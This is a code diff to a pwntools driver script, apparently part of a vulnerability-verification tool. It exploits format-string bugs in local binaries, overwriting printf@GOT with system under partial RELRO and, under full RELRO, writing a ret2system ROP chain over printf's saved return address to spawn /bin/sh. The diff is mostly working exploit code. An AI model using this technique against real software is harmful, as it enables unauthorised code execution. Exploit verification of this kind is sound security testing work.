@@ -9,13 +9,26 @@ from __future__ import annotations
 from ._sandbox import run_driver
 
 _DRIVER = r'''
-import sys
+import sys, os, time
 from pwn import *
 name = sys.argv[1]
 elf = ELF(name, checksec=False); context.binary = elf; context.log_level = "error"
 prompt = sys.argv[2].encode() if len(sys.argv) > 2 else b"say: "
 if "printf" not in elf.got:
     print("NOT_APPLICABLE (no printf@GOT)"); sys.exit(1)
+MARK = b"BINORACLE_FMT_PWNED"
+bn = os.path.basename(name)
+
+def _page_writable(pid, addr):
+    try:
+        for line in open("/proc/%d/maps" % pid):
+            lo, hi = (int(x, 16) for x in line.split()[0].split("-"))
+            if lo <= addr < hi:
+                return "w" in line.split()[1]
+    except Exception:
+        pass
+    return False
+
 io = process([elf.path], aslr=False)
 try:
     io.recvuntil(prompt, timeout=2)
@@ -33,10 +46,8 @@ if offset is None:
 libc = io.libc; system = libc.symbols["system"]
 pie_base = 0
 if elf.pie:
-    import os as _os
-    bn = _os.path.basename(name)
     for path, base in (io.libs() or {}).items():       # 1) pwntools' own mapping
-        if _os.path.basename(path) == bn:
+        if os.path.basename(path) == bn:
             pie_base = base; break
     if not pie_base:                                     # 2) /proc/<pid>/maps (lowest mapping)
         try:
@@ -48,26 +59,80 @@ if elf.pie:
     if not pie_base:
         pie_base = 0x555555554000                        # 3) standard ASLR-off PIE base
 printf_got = elf.got["printf"] + pie_base
-MARK = b"BINORACLE_FMT_PWNED"
-for wsz in ("short", "byte"):
-    try:
-        payload = fmtstr_payload(offset, {printf_got: system}, write_size=wsz)
-        io.sendline(payload)
-        io.recvuntil(prompt, timeout=3)
-        io.sendline(b"/bin/sh")
-        io.sendline(b"echo " + MARK)
-        out = io.recvrepeat(2)
-        if MARK in out:
-            print("VERIFIED offset=%d system=%#x printf_got=%#x" % (offset, system, printf_got))
-            sys.exit(0)
-    except Exception:
-        pass
-    # reopen for next attempt
-    try: io.close()
-    except Exception: pass
-    io = process([elf.path], aslr=False)
-    try: io.recvuntil(prompt, timeout=2)
-    except Exception: pass
+
+if _page_writable(io.pid, printf_got):
+    # Partial RELRO: printf@GOT is writable -> overwrite it with system so printf(buf)->system(buf).
+    for wsz in ("short", "byte"):
+        try:
+            payload = fmtstr_payload(offset, {printf_got: system}, write_size=wsz)
+            io.sendline(payload)
+            io.recvuntil(prompt, timeout=3)
+            io.sendline(b"/bin/sh")
+            io.sendline(b"echo " + MARK)
+            out = io.recvrepeat(2)
+            if MARK in out:
+                print("VERIFIED offset=%d system=%#x printf_got=%#x" % (offset, system, printf_got))
+                sys.exit(0)
+        except Exception:
+            pass
+        # reopen for next attempt
+        try: io.close()
+        except Exception: pass
+        io = process([elf.path], aslr=False)
+        try: io.recvuntil(prompt, timeout=2)
+        except Exception: pass
+    print("NOT_VERIFIED offset=%d" % offset)
+    sys.exit(1)
+
+# Full RELRO: printf@GOT is read-only (a %n write to it SIGSEGVs), so the GOT-overwrite technique
+# cannot work. The stack is writable and ASLR is off, so instead hijack the return address of the
+# current printf(buf) call: when this printf returns it runs a ret2system chain -> system("/bin/sh").
+# stdin stays open (no EOF needed), so the spawned shell reads our next line.
+binsh = next(libc.search(b"/bin/sh"))
+rop = ROP(libc)
+pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
+ret = rop.find_gadget(["ret"]).address
+# locate our input buffer and printf's saved return address on the stack via /proc/<pid>/mem
+MARKER = b"BORCfmtZ"
+io.sendline(MARKER)
+io.recvuntil(prompt, timeout=3)
+pie_lo = pie_hi = stack_lo = stack_hi = None
+for line in open("/proc/%d/maps" % io.pid):
+    f = line.split()
+    lo, hi = (int(x, 16) for x in f[0].split("-"))
+    if bn in line and "x" in f[1]:
+        pie_lo, pie_hi = lo, hi
+    if "[stack]" in line:
+        stack_lo, stack_hi = lo, hi
+if pie_lo is None or stack_lo is None:
+    print("NOT_VERIFIED offset=%d" % offset); sys.exit(1)
+with open("/proc/%d/mem" % io.pid, "rb", 0) as mem:
+    mem.seek(stack_lo); data = mem.read(stack_hi - stack_lo)
+buf_off = data.find(MARKER)
+if buf_off < 0:
+    print("NOT_VERIFIED offset=%d" % offset); sys.exit(1)
+buf_addr = stack_lo + buf_off
+printf_ret = None                                        # first qword below buf pointing into PIE code
+for a in range(buf_addr - 8, stack_lo, -8):
+    v = u64(data[a - stack_lo:a - stack_lo + 8])
+    if pie_lo <= v < pie_hi:
+        printf_ret = a; break
+if printf_ret is None:
+    print("NOT_VERIFIED offset=%d" % offset); sys.exit(1)
+chain = [ret, pop_rdi, binsh, system]                    # leading ret aligns the stack for system (movaps)
+writes = {printf_ret + i * 8: v for i, v in enumerate(chain)}
+try:
+    payload = fmtstr_payload(offset, writes, write_size="short")
+    io.sendline(payload)                                 # printf returns into the chain -> shell
+    time.sleep(0.3)
+    io.sendline(b"echo " + MARK)
+    out = io.recvrepeat(2)
+    if MARK in out:
+        print("VERIFIED offset=%d system=%#x printf_ret=%#x (ret2system, full RELRO)"
+              % (offset, system, printf_ret))
+        sys.exit(0)
+except Exception:
+    pass
 print("NOT_VERIFIED offset=%d" % offset)
 sys.exit(1)
 '''
